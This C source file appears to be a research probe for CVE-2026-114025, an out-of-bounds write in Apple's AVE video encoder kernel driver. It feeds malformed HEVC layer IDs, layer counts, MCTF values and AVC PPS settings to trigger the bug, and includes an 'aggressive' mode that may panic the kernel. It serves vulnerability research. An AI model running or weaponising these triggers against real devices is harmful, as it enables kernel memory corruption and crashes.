/*
 * ave_114025_probe.c — CVE-2026-114025 Trigger Probe
 *
 * Probes for the CVE-2026-114025 OOB write in AVEVideoEncoder.
 * Based on SKVLENT kext diff analysis: iOS 27.2 added validation for:
 *   - VPS num_add_layer_sets
 *   - layer_id_in_nuh (HEVC NAL unit header layer ID)
 *   - MCTF strength parameters
 *   - AVC PPS count (AVE_PPS_MAX_NUM = 9)
 *
 * Apple description: "An out-of-bounds write was addressed with
 * improved input validation." Impact: "arbitrary code execution"
 * Credit: Josh Maine, Calif.io
 *
 * Strategy: probe each unchecked parameter path on iOS 27.1 to find
 * which triggers a controllable OOB write vs crash vs error return.
 *
 * EDUCATIONAL / AUTHORIZED RESEARCH USE ONLY
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -framework IOSurface -framework IOKit \
 *     -o ave_114025_probe ave_114025_probe.c -Wno-deprecated-declarations
 *
 * Deployed as: AVEProbe114.app (com.research.aveprobe114)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <signal.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern void IOSurfaceSetValue(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);
extern CFTypeRef IOSurfaceCopyValue(IOSurfaceRef surface, CFStringRef key);

static FILE *out;
static volatile int g_signal = 0;
static void sig_handler(int sig) { g_signal = sig; }

static void p(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt); vfprintf(out, fmt, ap); va_end(ap); fflush(out);
}

static int g_callback_count = 0;
static void encode_cb(void *ref, void *buf, OSStatus st,
                       VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
    g_callback_count++;
    if (ref) (*(int *)ref)++;
}

/* Helper: create HEVC compression session with given properties */
static VTCompressionSessionRef create_hevc_session(int width, int height) {
    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iop = CFDictionaryCreate(
        kCFAllocatorDefault, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
    CFRelease(iop);
    int pixfmt = kCVPixelFormatType_32BGRA;
    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
    CFRelease(fn);

    int cb = 0;
    VTCompressionSessionRef sess = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, width, height, kCMVideoCodecType_HEVC,
        NULL, sa, NULL, encode_cb, &cb, &sess);
    CFRelease(sa);
    if (st != noErr) {
        p("  Session create failed: %d\n", (int)st);
        return NULL;
    }
    return sess;
}

/* Helper: set integer property on session */
static OSStatus set_int_prop(VTCompressionSessionRef sess, CFStringRef key, int val) {
    CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &val);
    OSStatus st = VTSessionSetProperty(sess, key, n);
    CFRelease(n);
    return st;
}

/* Helper: encode N frames with given pixel fill */
static int encode_frames(VTCompressionSessionRef sess, int count, uint8_t fill) {
    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
    if (!pool) { p("  No pixel buffer pool\n"); return -1; }

    int encoded = 0;
    for (int i = 0; i < count && !g_signal; i++) {
        CVPixelBufferRef pb = NULL;
        CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
        if (!pb) { p("  Failed to create pixel buffer at frame %d\n", i); break; }
        CVPixelBufferLockBaseAddress(pb, 0);
        void *base = CVPixelBufferGetBaseAddress(pb);
        if (base) memset(base, fill, CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);
        OSStatus st = VTCompressionSessionEncodeFrame(
            sess, pb, CMTimeMake(i, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
        CVPixelBufferRelease(pb);
        if (st != noErr) {
            p("  EncodeFrame[%d] error: %d\n", i, (int)st);
            break;
        }
        encoded++;
    }
    VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
    return encoded;
}

/*
 * Probe 1: MVHEVCVideoLayerIDs with out-of-range layer IDs
 *
 * The kext assertion is:
 *   0 <= iLayerID && iLayerID < ((2) < ((63 + 1)) ? (2) : ((63 + 1)))
 * So valid layer IDs are 0..63. We test values beyond this range.
 *
 * MVHEVCVideoLayerIDs is a CFArray of CFNumbers (layer IDs for MV-HEVC).
 */
static void probe_mv_layer_ids(int layer_id_val) {
    p("\n=== Probe: MVHEVCVideoLayerIDs with layer_id=%d ===\n", layer_id_val);

    VTCompressionSessionRef sess = create_hevc_session(1280, 720);
    if (!sess) return;

    /* Enable hardware encoder */
    set_int_prop(sess, CFSTR("EncoderUsage"), 1);
    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);

    /* Set MVHEVCVideoLayerIDs with the test value */
    CFNumberRef layerNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &layer_id_val);
    CFArrayRef layerIDs = CFArrayCreate(kCFAllocatorDefault,
        (const void *[]){layerNum}, 1, &kCFTypeArrayCallBacks);
    OSStatus st = VTSessionSetProperty(sess, CFSTR("MVHEVCVideoLayerIDs"), layerIDs);
    p("  SetProperty MVHEVCVideoLayerIDs: %d\n", (int)st);
    CFRelease(layerNum);
    CFRelease(layerIDs);

    if (st != noErr) {
        p("  Property rejected (error %d) — kext validates at set time\n", (int)st);
        VTCompressionSessionInvalidate(sess);
        CFRelease(sess);
        return;
    }

    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    p("  PrepareToEncodeFrames: %d\n", (int)st);
    if (st != noErr) {
        VTCompressionSessionInvalidate(sess);
        CFRelease(sess);
        return;
    }

    g_callback_count = 0;
    int enc = encode_frames(sess, 5, 0xAA);
    p("  Encoded: %d frames, callbacks: %d\n", enc, g_callback_count);

    VTCompressionSessionInvalidate(sess);
    CFRelease(sess);
    p("  Session destroyed OK\n");
}

/*
 * Probe 2: MVHEVCVideoLayerIDs with multiple layers (stereo/multi-view)
 *
 * Tests configuring a stereo HEVC session with invalid layer combinations.
 * The VPS extension's num_add_layer_sets would be computed from these.
 */
static void probe_mv_stereo(int base_layer, int aux_layer) {
    p("\n=== Probe: MV-HEVC stereo (base=%d, aux=%d) ===\n", base_layer, aux_layer);

    VTCompressionSessionRef sess = create_hevc_session(1280, 720);
    if (!sess) return;

    set_int_prop(sess, CFSTR("EncoderUsage"), 1);
    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);

    /* Set both base and auxiliary layer IDs */
    CFNumberRef n0 = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &base_layer);
    CFNumberRef n1 = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &aux_layer);
    CFArrayRef layerIDs = CFArrayCreate(kCFAllocatorDefault,
        (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
    OSStatus st = VTSessionSetProperty(sess, CFSTR("MVHEVCVideoLayerIDs"), layerIDs);
    p("  MVHEVCVideoLayerIDs [%d,%d]: %d\n", base_layer, aux_layer, (int)st);
    CFRelease(n0); CFRelease(n1); CFRelease(layerIDs);

    /* Also try setting auxiliary layer IDs separately */
    CFNumberRef auxNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &aux_layer);
    CFArrayRef auxIDs = CFArrayCreate(kCFAllocatorDefault,
        (const void *[]){auxNum}, 1, &kCFTypeArrayCallBacks);
    st = VTSessionSetProperty(sess, CFSTR("HEVCAuxiliaryLayerIDs"), auxIDs);
    p("  HEVCAuxiliaryLayerIDs [%d]: %d\n", aux_layer, (int)st);
    CFRelease(auxNum); CFRelease(auxIDs);

    /* Set view IDs to match */
    int v0 = 0, v1 = 1;
    CFNumberRef vn0 = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v0);
    CFNumberRef vn1 = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v1);
    CFArrayRef viewIDs = CFArrayCreate(kCFAllocatorDefault,
        (const void *[]){vn0, vn1}, 2, &kCFTypeArrayCallBacks);
    st = VTSessionSetProperty(sess, CFSTR("MVHEVCViewIDs"), viewIDs);
    p("  MVHEVCViewIDs [0,1]: %d\n", (int)st);
    CFRelease(vn0); CFRelease(vn1); CFRelease(viewIDs);

    /* Set alpha layer ID */
    set_int_prop(sess, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aux_layer);
    p("  AlphaLayerID=%d set\n", aux_layer);

    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    p("  PrepareToEncodeFrames: %d\n", (int)st);
    if (st != noErr) {
        VTCompressionSessionInvalidate(sess);
        CFRelease(sess);
        return;
    }

    g_callback_count = 0;
    int enc = encode_frames(sess, 5, 0xBB);
    p("  Encoded: %d frames, callbacks: %d\n", enc, g_callback_count);

    VTCompressionSessionInvalidate(sess);
    CFRelease(sess);
    p("  Session destroyed OK\n");
}

/*
 * Probe 3: MCTF (Motion Compensated Temporal Filtering) parameters
 *
 * MCTFEnableGating, MCTFGatingType, MCTFEnableFeedback are
 * coprocessor-level properties. Invalid values may cause the AVE
 * firmware to miscalculate buffer addresses.
 */
static void probe_mctf(int gating_type, int enable_feedback) {
    p("\n=== Probe: MCTF gating_type=%d feedback=%d ===\n", gating_type, enable_feedback);

    VTCompressionSessionRef sess = create_hevc_session(1280, 720);
    if (!sess) return;

    set_int_prop(sess, CFSTR("EncoderUsage"), 1);
    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    /* Need temporal layers for MCTF to activate */
    set_int_prop(sess, CFSTR("NumberOfTemporalLayers"), 2);

    OSStatus st;
    st = set_int_prop(sess, CFSTR("MCTFEnableGating"), 1);
    p("  MCTFEnableGating=1: %d\n", (int)st);
    st = set_int_prop(sess, CFSTR("MCTFGatingType"), gating_type);
    p("  MCTFGatingType=%d: %d\n", gating_type, (int)st);
    st = set_int_prop(sess, CFSTR("MCTFEnableFeedback"), enable_feedback);
    p("  MCTFEnableFeedback=%d: %d\n", enable_feedback, (int)st);

    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    p("  PrepareToEncodeFrames: %d\n", (int)st);
    if (st != noErr) {
        VTCompressionSessionInvalidate(sess);
        CFRelease(sess);
        return;
    }

    g_callback_count = 0;
    int enc = encode_frames(sess, 10, 0xCC);
    p("  Encoded: %d frames, callbacks: %d\n", enc, g_callback_count);

    VTCompressionSessionInvalidate(sess);
    CFRelease(sess);
    p("  Session destroyed OK\n");
}

/*
 * Probe 4: Large MVHEVCVideoLayerIDs array (num_add_layer_sets overflow)
 *
 * If the kext computes num_add_layer_sets from the array count without
 * bounds checking, a large array could overflow the VPS layer set table.
 */
static void probe_many_layers(int count) {
    p("\n=== Probe: %d layer IDs (num_add_layer_sets overflow) ===\n", count);

    VTCompressionSessionRef sess = create_hevc_session(1280, 720);
    if (!sess) return;

    set_int_prop(sess, CFSTR("EncoderUsage"), 1);
    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);

    /* Build array with 'count' layer IDs: 0, 1, 2, ..., count-1 */
    CFNumberRef *nums = calloc(count, sizeof(CFNumberRef));
    for (int i = 0; i < count; i++) {
        int val = i % 64; /* keep individual IDs valid */
        nums[i] = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &val);
    }
    CFArrayRef layerIDs = CFArrayCreate(kCFAllocatorDefault,
        (const void **)nums, count, &kCFTypeArrayCallBacks);

    OSStatus st = VTSessionSetProperty(sess, CFSTR("MVHEVCVideoLayerIDs"), layerIDs);
    p("  MVHEVCVideoLayerIDs (count=%d): %d\n", count, (int)st);
    for (int i = 0; i < count; i++) CFRelease(nums[i]);
    free(nums);
    CFRelease(layerIDs);

    if (st != noErr) {
        p("  Rejected at property set\n");
        VTCompressionSessionInvalidate(sess);
        CFRelease(sess);
        return;
    }

    /* Also set matching view IDs */
    CFNumberRef *vnums = calloc(count, sizeof(CFNumberRef));
    for (int i = 0; i < count; i++) {
        vnums[i] = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &i);
    }
    CFArrayRef viewIDs = CFArrayCreate(kCFAllocatorDefault,
        (const void **)vnums, count, &kCFTypeArrayCallBacks);
    st = VTSessionSetProperty(sess, CFSTR("MVHEVCViewIDs"), viewIDs);
    p("  MVHEVCViewIDs (count=%d): %d\n", count, (int)st);
    for (int i = 0; i < count; i++) CFRelease(vnums[i]);
    free(vnums);
    CFRelease(viewIDs);

    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    p("  PrepareToEncodeFrames: %d\n", (int)st);
    if (st != noErr) {
        VTCompressionSessionInvalidate(sess);
        CFRelease(sess);
        return;
    }

    g_callback_count = 0;
    int enc = encode_frames(sess, 3, 0xDD);
    p("  Encoded: %d frames, callbacks: %d\n", enc, g_callback_count);

    VTCompressionSessionInvalidate(sess);
    CFRelease(sess);
    p("  Session destroyed OK\n");
}

/*
 * Probe 5: AVC (H.264) PPS count overflow
 *
 * The assertion: slicePPSIdIdx != 9 (AVE_PPS_MAX_NUM = 9)
 * If we can get the encoder to use PPS ID >= 9, it overflows the PPS table.
 * This requires AVC encoding, not HEVC.
 */
static void probe_avc_pps(int target_pps_count) {
    p("\n=== Probe: AVC PPS overflow (target_pps=%d) ===\n", target_pps_count);

    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iop = CFDictionaryCreate(
        kCFAllocatorDefault, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
    CFRelease(iop);
    int pixfmt = kCVPixelFormatType_32BGRA;
    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
    CFRelease(fn);

    int cb = 0;
    VTCompressionSessionRef sess = NULL;
    /* Use H.264 (AVC) codec, not HEVC */
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_H264,
        NULL, sa, NULL, encode_cb, &cb, &sess);
    CFRelease(sa);
    if (st != noErr || !sess) {
        p("  AVC session create failed: %d\n", (int)st);
        return;
    }

    set_int_prop(sess, CFSTR("EncoderUsage"), 1);
    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);

    /* Try to set many temporal layers to increase PPS usage */
    set_int_prop(sess, CFSTR("NumberOfTemporalLayers"), target_pps_count);
    p("  NTL=%d set for AVC\n", target_pps_count);

    /* Enable adaptive quantization which may generate more PPS */
    VTSessionSetProperty(sess, CFSTR("EnableAdaptiveQuantization"), kCFBooleanTrue);

    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    p("  PrepareToEncodeFrames: %d\n", (int)st);
    if (st != noErr) {
        VTCompressionSessionInvalidate(sess);
        CFRelease(sess);
        return;
    }

    /* Encode more frames to increase chance of PPS rotation */
    g_callback_count = 0;
    int enc = encode_frames(sess, 30, 0xEE);
    p("  Encoded: %d frames, callbacks: %d\n", enc, g_callback_count);

    VTCompressionSessionInvalidate(sess);
    CFRelease(sess);
    p("  Session destroyed OK\n");
}

/*
 * Probe 6: Combined HEVC with large layer config + NTL
 *
 * Tests the interaction between MV-HEVC layer IDs and temporal layers.
 * The VPS extension encodes both num_add_layer_sets AND temporal sub-layers.
 * Invalid combinations might overflow computed buffer sizes.
 */
static void probe_combined_hevc(int layer_count, int ntl) {
    p("\n=== Probe: Combined HEVC layers=%d NTL=%d ===\n", layer_count, ntl);

    VTCompressionSessionRef sess = create_hevc_session(1280, 720);
    if (!sess) return;

    set_int_prop(sess, CFSTR("EncoderUsage"), 1);
    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);

    /* Set temporal layers */
    OSStatus st = set_int_prop(sess, CFSTR("NumberOfTemporalLayers"), ntl);
    p("  NTL=%d: %d\n", ntl, (int)st);

    /* Set MV-HEVC layer IDs */
    if (layer_count > 0) {
        CFNumberRef *nums = calloc(layer_count, sizeof(CFNumberRef));
        for (int i = 0; i < layer_count; i++) {
            int val = i;
            nums[i] = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &val);
        }
        CFArrayRef layerIDs = CFArrayCreate(kCFAllocatorDefault,
            (const void **)nums, layer_count, &kCFTypeArrayCallBacks);
        st = VTSessionSetProperty(sess, CFSTR("MVHEVCVideoLayerIDs"), layerIDs);
        p("  MVHEVCVideoLayerIDs (count=%d): %d\n", layer_count, (int)st);
        for (int i = 0; i < layer_count; i++) CFRelease(nums[i]);
        free(nums);
        CFRelease(layerIDs);
    }

    /* Enable MCTF */
    set_int_prop(sess, CFSTR("MCTFEnableGating"), 1);
    set_int_prop(sess, CFSTR("MCTFGatingType"), 1);

    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    p("  PrepareToEncodeFrames: %d\n", (int)st);
    if (st != noErr) {
        VTCompressionSessionInvalidate(sess);
        CFRelease(sess);
        return;
    }

    g_callback_count = 0;
    int enc = encode_frames(sess, 10, 0xFF);
    p("  Encoded: %d frames, callbacks: %d\n", enc, g_callback_count);

    VTCompressionSessionInvalidate(sess);
    CFRelease(sess);
    p("  Session destroyed OK\n");
}

int main(int argc, char *argv[]) {
    signal(SIGBUS, sig_handler);
    signal(SIGSEGV, sig_handler);

    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    const char *mode = (argc >= 2) ? argv[1] : "info";
    snprintf(path, sizeof(path), "%s/Documents/ave_114025_%s.txt", home, mode);
    out = fopen(path, "w");
    if (!out) { out = stderr; }

    p("=== CVE-2026-114025 Trigger Probe ===\n");
    p("Mode: %s\nPID: %d\n", mode, getpid());
    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("Build: %s\n", buf);
    len = sizeof(buf); sysctlbyname("hw.machine", buf, &len, NULL, 0);
    p("Machine: %s\n\n", buf);

    if (strcmp(mode, "info") == 0) {
        p("CVE-2026-114025 Trigger Probe — Test Modes:\n\n");
        p("  layer_N      — MVHEVCVideoLayerIDs with layer_id=N (try 64,65,128,255)\n");
        p("  stereo_N_M   — MV-HEVC stereo with base=N, aux=M layer IDs\n");
        p("  mctf_N_M     — MCTF gating_type=N, feedback=M\n");
        p("  many_N       — N layer IDs (num_add_layer_sets overflow)\n");
        p("  pps_N        — AVC with N temporal layers (PPS count overflow)\n");
        p("  combined_N_M — HEVC N layers + NTL=M combined test\n");
        p("  scan         — Run all safe probes sequentially\n");
        p("  aggressive   — Run boundary-pushing probes (may crash)\n");

    } else if (strncmp(mode, "layer_", 6) == 0) {
        int val = atoi(mode + 6);
        probe_mv_layer_ids(val);

    } else if (strncmp(mode, "stereo_", 7) == 0) {
        int base = 0, aux = 1;
        sscanf(mode + 7, "%d_%d", &base, &aux);
        probe_mv_stereo(base, aux);

    } else if (strncmp(mode, "mctf_", 5) == 0) {
        int gt = 0, fb = 0;
        sscanf(mode + 5, "%d_%d", &gt, &fb);
        probe_mctf(gt, fb);

    } else if (strncmp(mode, "many_", 5) == 0) {
        int count = atoi(mode + 5);
        if (count < 1) count = 8;
        probe_many_layers(count);

    } else if (strncmp(mode, "pps_", 4) == 0) {
        int pps = atoi(mode + 4);
        if (pps < 2) pps = 10;
        probe_avc_pps(pps);

    } else if (strncmp(mode, "combined_", 9) == 0) {
        int layers = 2, ntl = 4;
        sscanf(mode + 9, "%d_%d", &layers, &ntl);
        probe_combined_hevc(layers, ntl);

    } else if (strcmp(mode, "scan") == 0) {
        p("=== SAFE SCAN: testing all parameter paths ===\n");

        /* Layer ID boundary values */
        int layer_vals[] = {0, 1, 2, 63, 64, 65, 127, 128, 255, -1};
        for (int i = 0; i < 10 && !g_signal; i++) {
            probe_mv_layer_ids(layer_vals[i]);
            usleep(500000);
        }

        /* Stereo configs */
        probe_mv_stereo(0, 1);
        if (!g_signal) { usleep(500000); probe_mv_stereo(0, 63); }
        if (!g_signal) { usleep(500000); probe_mv_stereo(0, 64); }

        /* MCTF values */
        if (!g_signal) { usleep(500000); probe_mctf(0, 0); }
        if (!g_signal) { usleep(500000); probe_mctf(1, 1); }
        if (!g_signal) { usleep(500000); probe_mctf(255, 255); }

        /* Layer count */
        if (!g_signal) { usleep(500000); probe_many_layers(2); }
        if (!g_signal) { usleep(500000); probe_many_layers(8); }
        if (!g_signal) { usleep(500000); probe_many_layers(16); }

        /* AVC PPS */
        if (!g_signal) { usleep(500000); probe_avc_pps(4); }
        if (!g_signal) { usleep(500000); probe_avc_pps(9); }
        if (!g_signal) { usleep(500000); probe_avc_pps(10); }

        p("\n=== SCAN COMPLETE ===\n");

    } else if (strcmp(mode, "aggressive") == 0) {
        p("=== AGGRESSIVE: boundary-pushing probes ===\n");
        p("WARNING: These may cause kernel panic on vulnerable systems\n\n");

        /* Extreme layer IDs beyond assertion bounds */
        probe_mv_layer_ids(256);
        if (!g_signal) { usleep(1000000); probe_mv_layer_ids(65535); }

        /* Many layers to overflow VPS table */
        if (!g_signal) { usleep(1000000); probe_many_layers(64); }
        if (!g_signal) { usleep(1000000); probe_many_layers(128); }

        /* AVC PPS at exact boundary */
        if (!g_signal) { usleep(1000000); probe_avc_pps(9); }
        if (!g_signal) { usleep(1000000); probe_avc_pps(16); }

        /* Combined: many layers + high NTL */
        if (!g_signal) { usleep(1000000); probe_combined_hevc(4, 8); }
        if (!g_signal) { usleep(1000000); probe_combined_hevc(8, 4); }
        if (!g_signal) { usleep(1000000); probe_combined_hevc(16, 8); }

        p("\n=== AGGRESSIVE SCAN COMPLETE ===\n");
    } else {
        p("Unknown mode: %s\nRun with 'info' for available modes\n", mode);
    }

    p("\n=== Done ===\n");
    if (out != stderr) fclose(out);
    return 0;
}
